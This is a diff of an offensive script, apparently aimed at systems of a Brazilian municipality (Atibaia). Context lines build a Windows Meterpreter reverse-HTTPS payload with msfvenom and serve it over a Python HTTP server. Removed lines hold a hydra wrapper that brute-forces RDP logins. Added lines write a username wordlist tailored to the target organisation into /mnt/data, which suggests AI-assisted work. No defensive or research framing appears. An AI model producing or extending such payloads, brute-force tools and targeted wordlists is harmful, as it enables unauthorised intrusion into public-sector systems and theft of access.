@@ -6,32 +6,20 @@ msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f p
 
 python3 -m http.server 8080
 
-#!/usr/bin/env python3
-import os
-import subprocess
+# Recriando a wordlist personalizada de usuários após reset
 
-def brute_force_rdp(target_ip, userlist, passlist):
-    print(f"[+] Iniciando brute force no RDP ({target_ip}:3389)...")
-    hydra_command = [
-        'hydra', '-t', '4', '-V', '-f', '-u',
-        '-L', userlist,
-        '-P', passlist,
-        f'rdp://{target_ip}'
-    ]
-    subprocess.run(hydra_command)
+usernames = [
+    "admin", "administrator", "atibaia", "servidor", "sumas", "sumas57667", "prefeitura",
+    "contas", "financeiro", "user01", "user02", "secretaria", "ti", "tecnico", "suporte",
+    "gestor", "coordenador", "responsavel", "servidor1", "servidor2", "atibaia.local",
+    "a.sumas", "dirigente", "adm.atibaia", "servidor.atibaia", "admin.sumas", "diretoria",
+    "admin.ti", "servidor.ti"
+]
 
-if __name__ == "__main__":
-    userlist_path = "./userlist_atibaia_rdp.txt"
-    passlist_path = "./wordlist_atibaia_vnc.txt"  # reaproveitando a mesma wordlist de senhas
+# Salvar a wordlist em arquivo
+userlist_path = "/mnt/data/userlist_atibaia_rdp.txt"
+with open(userlist_path, "w") as f:
+    for user in usernames:
+        f.write(user + "\n")
 
-    if not os.path.exists(userlist_path):
-        print("[!] Lista de usuários não encontrada. Coloque o arquivo na mesma pasta com o nome 'userlist_atibaia_rdp.txt'")
-        exit(1)
-
-    if not os.path.exists(passlist_path):
-        print("[!] Wordlist de senhas não encontrada. Coloque o arquivo na mesma pasta com o nome 'wordlist_atibaia_vnc.txt'")
-        exit(1)
-
-    target_ip = input("Digite o IP do alvo RDP: ")
-
-    brute_force_rdp(target_ip, userlist_path, passlist_path)
+userlist_path
